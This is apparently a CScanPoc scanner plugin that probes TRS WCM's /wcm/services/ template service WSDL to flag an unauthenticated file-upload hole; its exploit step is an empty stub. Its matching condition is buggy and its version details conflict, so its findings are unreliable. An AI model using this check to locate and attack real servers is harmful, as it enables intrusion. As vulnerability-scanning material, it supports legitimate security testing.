# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TRSWCM_0001'  # 平台漏洞编号，留空
    name = 'TRS wcm 5.2 /wcm/services/ 文件上传漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2013-08-14'  # 漏洞公布时间
    desc = '''
        可以直接向服务器写入文件，文件名和内容可自定义；
        影响版本未知，大概是6.X吧，收费的家伙也没条件一一测试；
        是否通用未知，网上搜索了几个，都存在这问题。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'TRSWCM'  # 漏洞应用名称
    product_version = '6.X'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3acaf8b3-33af-4a04-aedd-db2915089a0c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/wcm/services/trs:templateservicefacade?wsdl'
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200 and 'writeFile' and 'writeSpecFile' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
